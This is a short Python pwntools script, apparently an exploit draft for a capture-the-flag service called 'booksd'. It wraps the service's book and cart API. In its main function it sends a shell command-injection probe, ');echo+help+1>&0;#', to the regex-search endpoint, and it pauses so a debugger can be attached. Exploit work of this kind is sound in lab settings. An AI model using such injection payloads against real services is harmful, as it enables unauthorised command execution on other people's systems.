#!/usr/bin/env python3

import requests as req
import re
from pwn import *
import sys
import time


exe = ELF("./booksd")



url_base = f"http://{sys.argv[1]}:{sys.argv[2]}/api/"

options = {
    "get": ("GET","book"),
    "get_id": ("GET","book/"),
    "new": ("PUT","book/"),
    "post_new": ("POST","book/"),
    "search_re": ("GET","book/search/"),
    "search": ("POST","book/search"),
    "get_cart": ("GET","cart"),
    "delete_cart": ("DELETE","cart"),
    "delete_cart_entry": ("DELETE","cart/"),
        }

def send_req(session, selection, url_params="", post_data={}):
    url = f"{url_base}{selection[1]}{url_params}"
    log.info(f"URL: {url}")
    req_type = selection[0]
    res = ""
    header= {
            "Content-Type": "application/json"
            }

    if req_type == "GET":
        res = session.get(url)
    
    if req_type == "POST":
        res = session.post(url, headers = header, data=post_data)

    if req_type == "PUT":
        res = session.put(url)

    if req_type == "DELETE":
        res = session.delete(url)

    try:
        log.info(f"{res.json()}")
    except:
        log.info(f"{res.content.decode()}")

    return res

def debug():
    input("attach debugger")

def main():
    log.info("starting session")
    s = req.Session()
    send_req(s, options["get"]) 
    send_req(s, options["new"], "1")
    debug()
    data = """);echo+help+1>&0;#"""
    send_req(s, options["search_re"], data)
    #log.info(str(stop -start))
    #send_req(s, options["new"],"2")
    #debug()
    send_req(s, options["get_cart"])


if __name__ == "__main__":
    main()
